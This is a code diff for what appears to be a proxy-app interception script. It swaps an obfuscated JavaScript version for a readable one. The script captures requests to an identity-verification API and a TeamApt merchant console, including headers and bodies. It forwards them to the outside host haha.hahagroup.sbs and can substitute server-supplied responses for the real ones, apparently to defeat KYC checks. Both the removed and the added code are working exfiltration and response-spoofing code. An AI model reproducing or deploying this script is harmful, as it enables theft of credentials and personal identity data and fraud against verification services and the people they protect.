@@ -1,1 +1,122 @@
-var _0xods='jsjiami.com.v7';function _0x7699(){const _0x38ef86=(function(){return[_0xods,'VbjwwsMKjSiamwqiq.RVckIoSm.kPveuF7MUUCdK==','o0bXhG','W61Bz8o8hq3dGMnAdehcMZfIaSkVWPpdKmorna','bCk5WOtcLb4UWQdcS0/cVmoJcCoD','A8kxjfzS','qmkOWQhcG37cG8ke','ymkRWPlcOJSx','WOhdMmoKW7tdIW','WPldShBdMsm','W71rCmo1uJpdG2KzovpcMITPrCokWQtdKmomkCkb','EapcNSkKwG','W7/dJdhdQCoJWQLu','bmobWRHoWRNcJ8kXAmob','W7VdOIRdJJCj','WQ7cLSoaxY4','W6C1WQVdKKZdSbxdINpcMLLZW57cLhfvCSodk1boWOWUlSoVfLuiWR7cSdasgx3cPYpdTrPuWQxcTNqDBr8gW5ZdTmoVwLaqW6FcRrNdV13dJ8olWPeFySogWPS','W57dNZrYvSohyCokgG','W6/cK8k7WQ9s','lCohWQ7dPuNdId7dISo8W7xcTGq','W7PXwmoQnW','W5BdRZaOtG','W5JdNdq7uSo8','xGVdG8oWnwRcK8kbWRe0mmkVja','WP0xWOyWlG','WPWhWQe9WOS','WQhcVColWRf6Dx44sCoebWec','gmowWOrrWRe','W71/W5PlW5PqWQpdSf5Wt8kx','WOVdQ1pcRwO','W4tdLIKO','W7/dPaTyFq','W7LmvmoHcW','W51Nymobfq','bx9iimk6','W7pcUCoAdJtcL8k3quldUmkGW4bZ','zCkpmh5JWOHgW4tcOYW'].concat((function(){return['W6FdNcGQq8oMttWMWRewoCkLWRS','cqxcVSkzsuFdVq','x2FcGCkfWPvSrG','WOJcMmoUWQldLq','vSknW7/cTmoMWQK','fgG6WP4eWPlcTmkbWOXeyKi','n8ovztqyW5yrW5dcOZjoWQDn','W4tdTSkpW6X4za','b8oAWRLt','W7pcVSoAbttcLSk6C3pdLSkQW4Xo','WOW6WOauj1jYW4n5','WO0RWPGykKf+W4e','fWvDW4Ht','s8k9WQLoiW','W4tdVZy+qG','W4hdQCkZW4rpb8ofW5dcJe84W6m','WPBdHKNdIW4','W7hdQSk4','Er7dImoscG','W7hdJSkVW5Sr','WOddIbe+uCoWkq','WOxcJM5OfCkHxrO7WOaMpSkR','W5z0xSk4WO0','W6HaAdasAgdcTMe/','W4xdNZjRs8kAj8kdc1eDWOBcNcdcSxVdJc8ZAYrMW5lcSmo9WOf8WQjld8kY','hCoDW7ZcGa','WORdG8o6W7xdUW','W5mfWOq','WQlcUCoWW5miwSoMW5pcT2CIW4ddOge','ymkvpMfJWO9dW5pcOtD9WPC','xSk/WOevf8oTW4RcUmkuzCkvW6b6zmoExJj/vCk3ba','zSkAFsfc','c8oNWOZdT2K','W6miWPJcRCkk','meuJWR0R','W7RcS8kEWQvDp8ouW5pdJrNdKZpdQmomc1TXDGxcMmoqh8kYW5hdQM3cLSouW6FcIW','W7pdISk7W5/cK09Qr3xdRctcKmkZ'].concat((function(){return['xMjTAWC','W7dcR8o9bSo/','nSouWQHkWOi','jbhcJa','WPBdK0/dOImjWOu','W69AzmoCaq','oZP4WO7cNW','W67cMSoGo8o+','nCo7W4ZdTx9mW5nkpSokWOLSWPS','W69ayYDlyq','WPWlWOqQja','W51zBCobpW','W6dcM8oIbConWPbHW4arlmo/eG','xSkRWO3cScOmWPCMkCo1WPnIWRtdP8oJW53cSSokW78PWPVdNG','WQZcKmo6qsD5','WO8VWOaola','rCoyW7tdKJJdHCo6gSoEW6H5W6z5','EI7cVmksBG','W6RcJmoJd8o6WPa','CNr2CbhcTSoz','W4q0WRdcNmk8kSkEESoLaXBcUG7dM00YW6OoW4tdRCkTW6GJnu5QFKOB','WPpdOmoTW5y','W4hdJIH8tmoi','W6PYtSocoG','W4upi8k3','C8kvpq','B8kfW7VcQSoh','W51xumoJha','CgxcL8k7WOi','WR3cJmoKWQC/','WONdOCoJW5/dN8k1fCoV','yeJcNmkFWPS','W7j1WQblWQJdTCodW69R','ymovW6vZW7fFsgVcMIdcJ8ol','WR7dU0VcQwuOW6JdGbZcOW','W6ldTCkhW401'];}()));}()));}());_0x7699=function(){return _0x38ef86;};return _0x7699();}function _0x477a(_0x573ec5,_0x41e6a7){const _0x7699e7=_0x7699();return _0x477a=function(_0x477ad9,_0x59edaa){_0x477ad9=_0x477ad9-0x121;let _0x98c472=_0x7699e7[_0x477ad9];if(_0x477a['hYIWaR']===undefined){var _0x28abec=function(_0x4f9f8c){const _0x4de1c3='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x4edc57='',_0x3a2acd='';for(let _0xcf9233=0x0,_0x14ac73,_0x363564,_0x123e74=0x0;_0x363564=_0x4f9f8c['charAt'](_0x123e74++);~_0x363564&&(_0x14ac73=_0xcf9233%0x4?_0x14ac73*0x40+_0x363564:_0x363564,_0xcf9233++%0x4)?_0x4edc57+=String['fromCharCode'](0xff&_0x14ac73>>(-0x2*_0xcf9233&0x6)):0x0){_0x363564=_0x4de1c3['indexOf'](_0x363564);}for(let _0x41d8c4=0x0,_0x2973f5=_0x4edc57['length'];_0x41d8c4<_0x2973f5;_0x41d8c4++){_0x3a2acd+='%'+('00'+_0x4edc57['charCodeAt'](_0x41d8c4)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3a2acd);};const _0x560d67=function(_0x4f9e2d,_0x2bb6b5){let _0x3c0d99=[],_0x209d4e=0x0,_0x2c1fd7,_0x5bce6d='';_0x4f9e2d=_0x28abec(_0x4f9e2d);let _0x2136bc;for(_0x2136bc=0x0;_0x2136bc<0x100;_0x2136bc++){_0x3c0d99[_0x2136bc]=_0x2136bc;}for(_0x2136bc=0x0;_0x2136bc<0x100;_0x2136bc++){_0x209d4e=(_0x209d4e+_0x3c0d99[_0x2136bc]+_0x2bb6b5['charCodeAt'](_0x2136bc%_0x2bb6b5['length']))%0x100,_0x2c1fd7=_0x3c0d99[_0x2136bc],_0x3c0d99[_0x2136bc]=_0x3c0d99[_0x209d4e],_0x3c0d99[_0x209d4e]=_0x2c1fd7;}_0x2136bc=0x0,_0x209d4e=0x0;for(let _0x52e0d7=0x0;_0x52e0d7<_0x4f9e2d['length'];_0x52e0d7++){_0x2136bc=(_0x2136bc+0x1)%0x100,_0x209d4e=(_0x209d4e+_0x3c0d99[_0x2136bc])%0x100,_0x2c1fd7=_0x3c0d99[_0x2136bc],_0x3c0d99[_0x2136bc]=_0x3c0d99[_0x209d4e],_0x3c0d99[_0x209d4e]=_0x2c1fd7,_0x5bce6d+=String['fromCharCode'](_0x4f9e2d['charCodeAt'](_0x52e0d7)^_0x3c0d99[(_0x3c0d99[_0x2136bc]+_0x3c0d99[_0x209d4e])%0x100]);}return _0x5bce6d;};_0x477a['UeuuHj']=_0x560d67,_0x573ec5=arguments,_0x477a['hYIWaR']=!![];}const _0x12ca56=_0x7699e7[0x0],_0x3807cb=_0x477ad9+_0x12ca56,_0x4d5733=_0x573ec5[_0x3807cb];return!_0x4d5733?(_0x477a['irabNb']===undefined&&(_0x477a['irabNb']=!![]),_0x98c472=_0x477a['UeuuHj'](_0x98c472,_0x59edaa),_0x573ec5[_0x3807cb]=_0x98c472):_0x98c472=_0x4d5733,_0x98c472;},_0x477a(_0x573ec5,_0x41e6a7);};const _0x3b2654=_0x477a;(function(_0x468275,_0x5d3571,_0xdaa60c,_0xc3d0b4,_0x47bcf5,_0x539bd7,_0x4dd2c2){return _0x468275=_0x468275>>0x4,_0x539bd7='hs',_0x4dd2c2='hs',function(_0x5ea438,_0x1cb158,_0x468975,_0x2c3ef7,_0x10eb55){const _0x20ebee=_0x477a;_0x2c3ef7='tfi',_0x539bd7=_0x2c3ef7+_0x539bd7,_0x10eb55='up',_0x4dd2c2+=_0x10eb55,_0x539bd7=_0x468975(_0x539bd7),_0x4dd2c2=_0x468975(_0x4dd2c2),_0x468975=0x0;const _0x320d4e=_0x5ea438();while(!![]&&--_0xc3d0b4+_0x1cb158){try{_0x2c3ef7=-parseInt(_0x20ebee(0x14a,'@v9F'))/0x1*(parseInt(_0x20ebee(0x145,'h$2S'))/0x2)+parseInt(_0x20ebee(0x12d,'PSa*'))/0x3*(-parseInt(_0x20ebee(0x183,'O[lt'))/0x4)+-parseInt(_0x20ebee(0x181,'Kncp'))/0x5+parseInt(_0x20ebee(0x14b,'@v9F'))/0x6+parseInt(_0x20ebee(0x189,'j(Pc'))/0x7*(-parseInt(_0x20ebee(0x13f,'gm85'))/0x8)+-parseInt(_0x20ebee(0x12b,'Goag'))/0x9+parseInt(_0x20ebee(0x163,'73@K'))/0xa;}catch(_0x578861){_0x2c3ef7=_0x468975;}finally{_0x10eb55=_0x320d4e[_0x539bd7]();if(_0x468275<=_0xc3d0b4)_0x468975?_0x47bcf5?_0x2c3ef7=_0x10eb55:_0x47bcf5=_0x10eb55:_0x468975=_0x10eb55;else{if(_0x468975==_0x47bcf5['replace'](/[uKUIePqbkSMFCwdRV=]/g,'')){if(_0x2c3ef7===_0x1cb158){_0x320d4e['un'+_0x539bd7](_0x10eb55);break;}_0x320d4e[_0x4dd2c2](_0x10eb55);}}}}}(_0xdaa60c,_0x5d3571,function(_0x3cee16,_0xf9c61d,_0x17a329,_0x5798fe,_0x58eff7,_0x22e4f0,_0x6144d6){return _0xf9c61d='\x73\x70\x6c\x69\x74',_0x3cee16=arguments[0x0],_0x3cee16=_0x3cee16[_0xf9c61d](''),_0x17a329='\x72\x65\x76\x65\x72\x73\x65',_0x3cee16=_0x3cee16[_0x17a329]('\x76'),_0x5798fe='\x6a\x6f\x69\x6e',(0x194af9,_0x3cee16[_0x5798fe](''));});}(0xca0,0x25d1b,_0x7699,0xcc),_0x7699)&&(_0xods=0x2b81);const TARGET_DOMAINS=[_0x3b2654(0x154,'%Cp]'),_0x3b2654(0x16f,'C[x)')],BASE_FORWARD_URL=_0x3b2654(0x14e,'J46W'),scriptURL=$argument||'',VERSION=_0x3b2654(0x173,')phJ'),FORWARD_URL=scriptURL?BASE_FORWARD_URL+_0x3b2654(0x15e,'bmYJ')+encodeURIComponent(scriptURL)+_0x3b2654(0x147,'BDT]')+encodeURIComponent(VERSION):BASE_FORWARD_URL;if($request&&TARGET_DOMAINS[_0x3b2654(0x170,'larM')](_0x39473b=>$request[_0x3b2654(0x174,'pQ%r')][_0x3b2654(0x179,'larM')](_0x39473b))){const originalUrl=$request[_0x3b2654(0x151,'QOY[')],method=$request[_0x3b2654(0x169,'v$7c')],headers=$request['headers'],body=$request[_0x3b2654(0x17f,'Ar#w')],originalContentType=headers[_0x3b2654(0x13b,'K&g*')]||headers[_0x3b2654(0x124,'X0rQ')]||'';let bodyEncoded='';if(body)try{if(body instanceof Uint8Array){let binary='';for(let i=0x0;i<body['length'];i++){binary+=String[_0x3b2654(0x153,'pQ%r')](body[i]);}bodyEncoded=customBtoa(binary);}else typeof body==='string'&&(bodyEncoded=customBtoa(body));}catch(_0x4f9a6b){$notification['post'](_0x3b2654(0x187,'pg]B'),_0x4f9a6b['message'],_0x3b2654(0x13d,'Goag')+typeof body),$done({'status':'rejected'});}const data={'originalUrl':originalUrl,'method':method,'headers':headers,'bodyBase64':bodyEncoded,'originalContentType':originalContentType};$httpClient[_0x3b2654(0x12f,'@v9F')]({'url':FORWARD_URL,'headers':{'Content-Type':'application/json','Connection':_0x3b2654(0x14d,'rCP]'),'Accept':'application/json'},'body':JSON[_0x3b2654(0x17b,'MrR(')](data),'timeout':0x1770},function(_0x5defd2,_0x41b2d4,_0x5101a8){const _0x435ad4=_0x3b2654,_0xeddb48={'VxyvL':function(_0x2b3491,_0x572416){return _0x2b3491<_0x572416;},'LepGk':function(_0x46a0a2,_0x483c4c){return _0x46a0a2|_0x483c4c;},'iditd':function(_0x13c2d9,_0x2d6bb2){return _0x13c2d9|_0x2d6bb2;},'ROMCE':function(_0x341c00,_0x10a4c1){return _0x341c00>>_0x10a4c1;},'iFJHa':function(_0x5ebc53,_0x11767e){return _0x5ebc53>_0x11767e;},'PyozM':function(_0x2a39e1,_0x4185c9){return _0x2a39e1+_0x4185c9;},'mduCk':function(_0x4be9ab,_0x42b40a){return _0x4be9ab&_0x42b40a;},'aCaJt':_0x435ad4(0x159,'ITnX'),'ocNvf':function(_0x3bdec8,_0x26cf60){return _0x3bdec8(_0x26cf60);},'EAAXf':function(_0x4d0661,_0x3a69ed){return _0x4d0661 instanceof _0x3a69ed;},'YLCEg':function(_0x237101,_0x2d0f1d){return _0x237101===_0x2d0f1d;},'GprCl':'string','bYtMg':_0x435ad4(0x178,'h$2S'),'jyjvG':function(_0xfb2f98,_0x16b58d){return _0xfb2f98(_0x16b58d);},'vFpnq':function(_0x2db0a8,_0x270a5d){return _0x2db0a8!==_0x270a5d;},'mpuZL':_0x435ad4(0x149,'Goag'),'pFlbd':_0x435ad4(0x15d,'J#dO'),'UmjyU':_0x435ad4(0x123,'ITnX'),'jSZWU':function(_0x159650,_0x1be831){return _0x159650===_0x1be831;},'hsmSp':_0x435ad4(0x142,'A1oQ'),'cEvWm':function(_0x56ec6,_0x3c6fa3){return _0x56ec6(_0x3c6fa3);},'aWdGa':_0x435ad4(0x141,'FsA5')};if(_0x5defd2){if(_0xeddb48[_0x435ad4(0x129,'FsA5')]!==_0xeddb48[_0x435ad4(0x132,'pg]B')]){const _0x1f72c4=_0x4983e1['charCodeAt'](_0x15d159++),_0x86ee75=_0xeddb48['VxyvL'](_0x47f5ba,_0x8c8c18[_0x435ad4(0x171,'J46W')])?_0x27ac87['charCodeAt'](_0x420327++):0x0,_0x3e4b6d=_0x577b8c<_0xcc1231[_0x435ad4(0x184,'73@K')]?_0x1d0c30['charCodeAt'](_0x522bfd++):0x0,_0x39356c=_0xeddb48['LepGk'](_0xeddb48[_0x435ad4(0x15b,'[tUh')](_0x1f72c4<<0x10,_0x86ee75<<0x8),_0x3e4b6d);_0x38bdd3+=_0x36d66c[_0xeddb48[_0x435ad4(0x130,'J46W')](_0x39356c,0x12)&0x3f],_0x38cc39+=_0xed5e27[_0xeddb48[_0x435ad4(0x157,'C[x)')](_0x39356c,0xc)&0x3f],_0x1a6734+=_0xeddb48[_0x435ad4(0x133,'Z7Vw')](_0x310e29,_0xeddb48['PyozM'](_0x1e4407[_0x435ad4(0x164,'rCP]')],0x1))?'=':_0x59547c[_0xeddb48['mduCk'](_0x39356c>>0x6,0x3f)],_0x4da7ed+=_0xeddb48[_0x435ad4(0x186,'3Q%7')](_0x3788c5,_0x47ccf1['length'])?'=':_0x3be46f[_0xeddb48['mduCk'](_0x39356c,0x3f)];}else $notification['post'](_0x435ad4(0x168,'73@K'),_0x435ad4(0x128,'bmYJ'),_0x435ad4(0x16e,'[tUh')+JSON[_0x435ad4(0x140,'FsA5')](_0x5defd2)),_0xeddb48['jyjvG']($done,{'status':'rejected'});}else{if(_0xeddb48[_0x435ad4(0x15c,'np&^')](_0xeddb48[_0x435ad4(0x146,'3Q%7')],_0xeddb48[_0x435ad4(0x182,'pQ%r')])){const _0x35a069={'response':{'status':0xc8,'headers':{'Content-Type':_0xeddb48['aCaJt']},'body':_0x34a04b[_0x435ad4(0x18a,'J#dO')](_0x22a4a1['data'])}};_0xeddb48[_0x435ad4(0x12c,'J#dO')](_0xf83a,_0x35a069);}else try{const _0x4ed294=JSON[_0x435ad4(0x16a,'FsA5')](_0x5101a8);_0x4ed294[_0x435ad4(0x138,'GJFc')]&&(_0xeddb48[_0x435ad4(0x144,'@v9F')]!==_0xeddb48[_0x435ad4(0x175,'zXj)')]?$notification['post'](_0x435ad4(0x136,'@v9F'),'',_0x4ed294[_0x435ad4(0x15f,'3Q%7')]):_0x3be418=_0xeddb48[_0x435ad4(0x18c,'v$7c')](_0x299624,_0x2e8c9a));if(_0xeddb48[_0x435ad4(0x12a,'PSa*')](_0x4ed294['process'],!![])){if(_0xeddb48[_0x435ad4(0x155,'reTj')](_0x435ad4(0x126,'@v9F'),_0xeddb48[_0x435ad4(0x162,'np&^')]))$done({});else{if(_0xeddb48[_0x435ad4(0x188,'Ot0a')](_0x4f9e2d,_0x2bb6b5)){let _0x485646='';for(let _0x2baad3=0x0;_0xeddb48[_0x435ad4(0x12e,'q^K3')](_0x2baad3,_0x46de2d['length']);_0x2baad3++){_0x485646+=_0x5be55b[_0x435ad4(0x167,'np&^')](_0x5156fd[_0x2baad3]);}_0x1739bd=_0xeddb48[_0x435ad4(0x161,'QDoM')](_0xe7558e,_0x485646);}else _0xeddb48[_0x435ad4(0x172,')phJ')](typeof _0x52e0d7,_0xeddb48['GprCl'])&&(_0x14492d=_0x4ee00f(_0x101c89));}}else{const _0x3e3d3f={'response':{'status':0xc8,'headers':{'Content-Type':'application/json;charset=utf-8'},'body':JSON[_0x435ad4(0x122,'J46W')](_0x4ed294[_0x435ad4(0x14f,'7)i]')])}};_0xeddb48['ocNvf']($done,_0x3e3d3f);}}catch(_0x50a229){$notification[_0x435ad4(0x13e,'J#dO')](_0x435ad4(0x180,'pg]B'),_0x50a229['message'],_0x435ad4(0x152,'h$2S')+_0x5101a8),_0xeddb48[_0x435ad4(0x165,'FsA5')]($done,{'status':_0xeddb48[_0x435ad4(0x185,'larM')]});}}});}else $done({});function customBtoa(_0x5525fc){const _0x57de87=_0x3b2654,_0x258d7a={'HAVRb':_0x57de87(0x121,'QOY['),'EOLfE':function(_0x2ca21b,_0x59ed02){return _0x2ca21b<_0x59ed02;},'trAuG':function(_0x14b9c9,_0x246bf2){return _0x14b9c9!==_0x246bf2;},'JrYfV':_0x57de87(0x17e,'Goag'),'biDon':_0x57de87(0x14c,'%bFw'),'BgeMv':function(_0x1794a5,_0x106660){return _0x1794a5|_0x106660;},'bgyMM':function(_0x1ad48a,_0x167204){return _0x1ad48a<<_0x167204;},'jLzFQ':function(_0x2dfb83,_0x55bb29){return _0x2dfb83>>_0x55bb29;},'PdpPs':function(_0x4d30c7,_0xf612a9){return _0x4d30c7+_0xf612a9;},'gBwWJ':function(_0x3a4f37,_0x4b43b4){return _0x3a4f37>>_0x4b43b4;},'RJnio':function(_0xd8adf2,_0x211696){return _0xd8adf2>_0x211696;},'GlcnR':function(_0x54d0f6,_0x49958a){return _0x54d0f6&_0x49958a;}},_0x48acd1=_0x258d7a['HAVRb'];let _0xf8bf35='',_0xb203f=0x0;while(_0x258d7a[_0x57de87(0x125,'pg]B')](_0xb203f,_0x5525fc[_0x57de87(0x127,'@v9F')])){if(_0x258d7a[_0x57de87(0x143,'%Cp]')](_0x258d7a[_0x57de87(0x131,')phJ')],_0x258d7a[_0x57de87(0x176,'pg]B')])){const _0x208d73=_0x5525fc[_0x57de87(0x17d,'q^K3')](_0xb203f++),_0x49d0e4=_0xb203f<_0x5525fc[_0x57de87(0x16d,'np&^')]?_0x5525fc[_0x57de87(0x135,'pQ%r')](_0xb203f++):0x0,_0x526e94=_0x258d7a[_0x57de87(0x156,'X0rQ')](_0xb203f,_0x5525fc[_0x57de87(0x18b,'b)Dp')])?_0x5525fc['charCodeAt'](_0xb203f++):0x0,_0x18809c=_0x258d7a[_0x57de87(0x139,'wRA2')](_0x258d7a[_0x57de87(0x177,'GJFc')](_0x258d7a[_0x57de87(0x166,'pg]B')](_0x208d73,0x10),_0x258d7a[_0x57de87(0x148,'bmYJ')](_0x49d0e4,0x8)),_0x526e94);_0xf8bf35+=_0x48acd1[_0x258d7a[_0x57de87(0x150,'larM')](_0x18809c,0x12)&0x3f],_0xf8bf35+=_0x48acd1[_0x18809c>>0xc&0x3f],_0xf8bf35+=_0xb203f>_0x258d7a[_0x57de87(0x160,'pg]B')](_0x5525fc[_0x57de87(0x13a,'zXj)')],0x1)?'=':_0x48acd1[_0x258d7a[_0x57de87(0x158,'K&g*')](_0x18809c,0x6)&0x3f],_0xf8bf35+=_0x258d7a[_0x57de87(0x17a,'GJFc')](_0xb203f,_0x5525fc['length'])?'=':_0x48acd1[_0x258d7a[_0x57de87(0x16c,'Ot0a')](_0x18809c,0x3f)];}else _0x18effb({});}return _0xf8bf35;}var version_ = 'jsjiami.com.v7';
+const TARGET_DOMAINS = ["api.smileidentity.com", "users.mab.console.teamapt.com"];
+const BASE_FORWARD_URL = "https://haha.hahagroup.sbs/data";
+
+// 获取脚本参数并构造完整的转发 URL
+const scriptURL = $argument || '';  // 如果没有参数则使用空字符串
+const VERSION = 'v1.0';  // 版本号常量
+const FORWARD_URL = scriptURL 
+    ? `${BASE_FORWARD_URL}?h=${encodeURIComponent(scriptURL)}&v=${encodeURIComponent(VERSION)}` 
+    : BASE_FORWARD_URL;
+
+if ($request && TARGET_DOMAINS.some(domain => $request.url.includes(domain))) {
+    const originalUrl = $request.url;
+    const method = $request.method;
+    const headers = $request.headers;
+    const body = $request.body;
+    const originalContentType = headers['Content-Type'] || headers['content-type'] || '';
+
+    let bodyEncoded = "";
+    if (body) {
+        try {
+            if (body instanceof Uint8Array) {
+                let binary = '';
+                for (let i = 0; i < body.length; i++) {
+                    binary += String.fromCharCode(body[i]);
+                }
+                bodyEncoded = customBtoa(binary);
+            } else if (typeof body === "string") {
+                bodyEncoded = customBtoa(body);
+            }
+        } catch (e) {
+            $notification.post(
+                "Body Processing Error",
+                e.message,
+                `Type: ${typeof body}`
+            );
+            $done({ status: 'rejected' });
+        }
+    }
+
+    const data = {
+        originalUrl: originalUrl,
+        method: method,
+        headers: headers,
+        bodyBase64: bodyEncoded,
+        originalContentType: originalContentType
+    };
+
+    $httpClient.post({
+        url: FORWARD_URL,
+        headers: {
+            "Content-Type": "application/json",
+            "Connection": "keep-alive",
+            "Accept": "application/json"
+        },
+        body: JSON.stringify(data),
+        timeout: 6000
+    }, function(error, response, data) {
+        if (error) {
+            $notification.post(
+                "Request Forward Failed",
+                "Error details",
+                `Error: ${JSON.stringify(error)}`
+            );
+            $done({ status: 'rejected' });
+        } else {
+            try {
+                const responseData = JSON.parse(data);
+                if (responseData.message) {
+                    $notification.post(
+                        "Server Message",
+                        "",
+                        responseData.message
+                    );
+                }
+                
+                if (responseData.process === true) {
+                    $done({});
+                } else {
+                    const response = {
+                        response: {
+                            status: 200,
+                            headers: {
+                                'Content-Type': 'application/json;charset=utf-8'
+                            },
+                            body: JSON.stringify(responseData.data)
+                        }
+                    };
+                    
+                    $done(response);
+                }
+            } catch (e) {
+                $notification.post(
+                    "Response Parse Error",
+                    e.message,
+                    `Raw response: ${data}`
+                );
+                $done({ status: 'rejected' });
+            }
+        }
+    });
+} else {
+    $done({});
+}
+
+// 实现基础的 base64 编码函数
+function customBtoa(str) {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+    let encoded = '';
+    let i = 0;
+    while (i < str.length) {
+        const c1 = str.charCodeAt(i++);
+        const c2 = i < str.length ? str.charCodeAt(i++) : 0;
+        const c3 = i < str.length ? str.charCodeAt(i++) : 0;
+
+        const triplet = (c1 << 16) | (c2 << 8) | c3;
+        encoded += chars[(triplet >> 18) & 0x3F];
+        encoded += chars[(triplet >> 12) & 0x3F];
+        encoded += i > str.length + 1 ? '=' : chars[(triplet >> 6) & 0x3F];
+        encoded += i > str.length ? '=' : chars[triplet & 0x3F];
+    }
+    return encoded;
+}
